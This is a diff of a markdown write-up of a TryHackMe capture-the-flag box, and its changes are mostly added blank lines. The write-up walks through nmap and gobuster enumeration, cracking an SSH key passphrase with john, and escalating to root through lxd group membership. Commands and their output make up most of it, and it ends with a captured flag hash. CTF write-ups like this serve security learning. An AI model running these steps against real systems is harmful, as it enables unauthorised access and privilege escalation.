@@ -14,6 +14,8 @@ tags: tryhackme
 Found two ports running on the machine
 1. HTTP - 80
 2. SSH  - 22
+
+
 ```console
 ❯ nmap -sC -sV 10.10.155.204 | tee nmap.log
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 11:30 IST
@@ -40,6 +42,8 @@ On the website found user name `john` in comments
 Found two suspicious directorities.
 1. uploads
 2. secret
+
+
 ```console
 ❯ gobuster dir --url http://10.10.155.204  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.log
 ===============================================================
@@ -65,6 +69,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 - The `/uploads` directory had dict.lst file
 ## JOHN
 Used ssh2john to convert key to hash and cracked the hash with john and wordlist as dict.lst
+
+
 ```console
 ❯ john -w=dict.lst hash | tee john.log
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -74,6 +80,8 @@ letmein        <------User password for ssh_key  (hash.txt)
 ```
 ## SSH
 Secure shelled the device with
+
+
 ```console
 ❯ ssh -i hash.txt john@10.10.155.204
 Enter passphrase for key 'hash.txt': 
@@ -105,11 +113,13 @@ Last login: Sun Oct  9 06:11:48 2022 from 10.17.39.205
 john@exploitable:~$
 ```
 On Checking users found user lxd 
+
 ```console
 john@exploitable:/tmp$ id
 uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
 Clone repository [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) to make a new lxd image
+
 ```console
 ❯ git clone  https://github.com/saghul/lxd-alpine-builder.git
 Cloning into 'lxd-alpine-builder'...
@@ -159,9 +169,10 @@ fetch http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64/APKINDEX.tar.gz
 (21/21) Installing alpine-base (3.16.2-r0)
 Executing busybox-1.35.0-r17.trigger
 OK: 8 MiB in 21 packages
-
 ```
+
 Moved the `.tar.gz` file to the compromised machine and loaded the image to gain root access
+
 ```console
 john@exploitable:/tmp$ lxc image import ./alpine-v3.16-x86_64-20221009_1156.tar.gz  --alias myimage
 Image imported with fingerprint: 77a84ec6d1ed4950dcb6b981b635127be5191fb94fcd55d84c1
@@ -184,4 +195,5 @@ find: /sys/kernel/debug: Permission denied
 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
 / # 
 ```
+
 **Device Pwned ;)** 😉
